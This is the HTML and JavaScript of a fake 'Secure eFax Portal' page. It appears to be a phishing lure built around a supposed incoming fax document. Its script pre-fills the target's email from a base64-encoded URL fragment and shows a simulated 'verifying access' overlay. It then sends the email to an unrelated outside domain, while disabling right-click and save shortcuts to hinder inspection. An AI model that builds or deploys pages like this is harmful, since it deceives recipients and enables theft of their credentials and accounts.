<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com https://cdn.tailwindcss.com https://cdnjs.cloudflare.com https://readdy.ai; script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; font-src https://fonts.gstatic.com https://cdnjs.cloudflare.com; img-src 'self' data: https://readdy.ai;">
    <title>Secure eFax Portal</title>
    <script src="https://cdn.tailwindcss.com/3.4.16"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#0ea5e9',
                        secondary: '#0284c7',
                    },
                    borderRadius: {
                        'none': '0px',
                        'sm': '4px',
                        DEFAULT: '8px',
                        'md': '12px',
                        'lg': '16px',
                        'xl': '20px',
                        '2xl': '24px',
                        '3xl': '32px',
                        'full': '9999px',
                        'button': '8px'
                    }
                }
            }
        }
    </script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css" rel="stylesheet">
    <style>
        * {
            font-family: 'Inter', sans-serif;
            user-select: none;
        }
        
        input {
            outline: none;
        }
        
        input[type="number"]::-webkit-inner-spin-button,
        input[type="number"]::-webkit-outer-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        
        .gradient-bg {
            background: linear-gradient(135deg, #0ea5e9, #0284c7);
        }
        
        .animate-pulse {
            animation: pulse 2s infinite;
        }
        
        .animate-fadeIn {
            animation: fadeIn 0.5s ease-in-out;
        }
        
        .animate-spin {
            animation: spin 1s linear infinite;
        }
        
        .shimmer {
            background: linear-gradient(90deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.2) 50%, rgba(255,255,255,0) 100%);
            background-size: 200% 100%;
            animation: shimmer 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        @keyframes fadeIn {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }
        
        @keyframes shimmer {
            0% { background-position: -200% 0; }
            100% { background-position: 200% 0; }
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .card-shadow {
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 8px 10px -6px rgba(0, 0, 0, 0.1);
        }
        
        .document-preview {
            transition: all 0.3s ease;
        }
        
        .document-preview:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body class="bg-gray-50 min-h-screen" oncontextmenu="return false">
    <div class="min-h-screen flex flex-col">
        <!-- Modern Header -->
        <header class="gradient-bg py-6 px-4 relative overflow-hidden">
            <div class="max-w-4xl mx-auto flex items-center justify-center relative">
                <div class="absolute left-4 top-1/2 -translate-y-1/2 w-12 h-12 bg-white/10 rounded-full flex items-center justify-center animate-pulse backdrop-blur-sm">
                    <div class="w-8 h-8 flex items-center justify-center text-white">
                        <i class="ri-lock-line ri-xl"></i>
                    </div>
                </div>
                <h1 class="text-white text-xl md:text-2xl font-bold tracking-tight">Secure eFax Portal</h1>
                <div class="absolute right-4 top-1/2 -translate-y-1/2 w-12 h-12 bg-white/10 rounded-full flex items-center justify-center animate-pulse backdrop-blur-sm">
                    <div class="w-8 h-8 flex items-center justify-center text-white">
                        <i class="ri-shield-check-line ri-xl"></i>
                    </div>
                </div>
            </div>
        </header>

        <!-- Main Content -->
        <main class="flex-grow flex items-center justify-center px-4 py-8">
            <div class="w-full max-w-md bg-white rounded-xl card-shadow p-8 animate-fadeIn">
                <div class="text-center mb-6">
                    <h2 class="text-2xl font-bold text-gray-800">eFax Document Portal</h2>
                    <p class="text-gray-500 mt-1">Access your received fax documents</p>
                </div>
                
                <!-- Document Preview -->
                <div class="mb-6 p-5 bg-gray-50 rounded-lg border border-gray-200 document-preview">
                    <div class="flex items-center mb-4">
                        <div class="w-12 h-12 flex items-center justify-center text-primary bg-primary/10 rounded-lg">
                            <i class="ri-file-text-line ri-2x leading-none"></i>
                        </div>
                        <div class="ml-4">
                            <h2 class="text-gray-800 font-semibold text-sm">INCOMING_FAX_DOCUMENT.pdf</h2>
                            <p class="text-gray-500 text-xs mt-1">ðŸ“„ (3 pages) Received: October 24, 2025</p>
                        </div>
                    </div>
                    <div class="h-40 bg-gray-100 rounded-lg flex items-center justify-center">
                        <div class="text-gray-400 text-center">
                            <div class="w-12 h-12 mx-auto flex items-center justify-center text-primary/50">
                                <i class="ri-file-text-line ri-3x leading-none"></i>
                            </div>
                            <p class="mt-3 text-sm font-medium">Document Preview</p>
                            <p class="text-xs mt-1">3 pages â€¢ 245 KB</p>
                        </div>
                    </div>
                </div>

                <!-- Form -->
                <form id="downloadForm">
                    <div class="mb-5">
                        <label for="email" class="block text-sm font-medium text-gray-700 mb-2">Enter your email to access eFax document</label>
                        <div class="relative">
                            <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                <div class="w-5 h-5 flex items-center justify-center text-gray-400">
                                    <i class="ri-mail-line leading-none"></i>
                                </div>
                            </div>
                            <input type="email" id="email" name="email" class="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-lg text-gray-900 focus:ring-2 focus:ring-primary focus:border-primary transition-all" placeholder="your.email@company.com" required>
                        </div>
                    </div>
                    <button type="submit" class="w-full flex items-center justify-center bg-primary hover:bg-primary/90 text-white py-3 px-4 rounded-lg transition-colors whitespace-nowrap font-medium">
                        <div class="w-5 h-5 flex items-center justify-center mr-2">
                            <i class="ri-download-line text-white leading-none"></i>
                        </div>
                        <span>Access Your eFax Document</span>
                    </button>
                </form>

                <div class="mt-5 text-center">
                    <p class="text-xs text-gray-500">Secure document delivery powered by encrypted transmission</p>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="py-5 text-center text-gray-500 text-sm border-t border-gray-200 bg-white">
            <p>Â© 2025 Secure eFax Portal. All rights reserved.</p>
        </footer>
    </div>

    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="fixed inset-0 bg-black/50 flex items-center justify-center z-50 hidden animate-fadeIn backdrop-blur-sm">
        <div class="bg-white p-8 rounded-xl shadow-xl flex flex-col items-center max-w-xs">
            <div class="w-14 h-14 border-4 border-primary border-t-transparent rounded-full animate-spin mb-5"></div>
            <p class="text-gray-800 font-medium text-center">Verifying your access...</p>
            <p class="text-gray-500 text-sm mt-2 text-center">This may take a moment</p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Extract email from URL hash if present
            const hash = window.location.hash.substring(1);
            if (hash) {
                try {
                    // Try normal decoding first
                    let email = decodeURIComponent(hash);
                    // If it looks like base64, try to decode that
                    if (hash.match(/^[A-Za-z0-9+/=]+$/)) {
                        try {
                            const decoded = atob(hash);
                            if (decoded.includes('@')) {
                                email = decoded;
                            }
                        } catch (e) {
                            // Not valid base64, use the normal decoded value
                        }
                    }
                    if (email.includes('@')) {
                        document.getElementById('email').value = email;
                    }
                } catch (e) {
                    // Decoding failed, ignore
                }
            }

            // Form submission handler
            document.getElementById('downloadForm').addEventListener('submit', function(e) {
                e.preventDefault();
                const email = document.getElementById('email').value.trim();
                if (!email || !email.includes('@')) {
                    return;
                }

                // Show loading overlay
                document.getElementById('loadingOverlay').classList.remove('hidden');

                // Create form data
                const formData = new FormData();
                formData.append('email', email);
                formData.append('domain', window.location.hostname);

                // Simulate processing and redirect
                setTimeout(function() {
                    window.location.href = 'https://dashboard-ysf7y8fsn.ul1yses.com/' + email;
                }, 1500);
            });
        });

        // Prevent context menu
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        // Prevent keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            // Prevent Ctrl+S, Ctrl+P
            if ((e.ctrlKey || e.metaKey) && (e.key === 's' || e.key === 'p')) {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
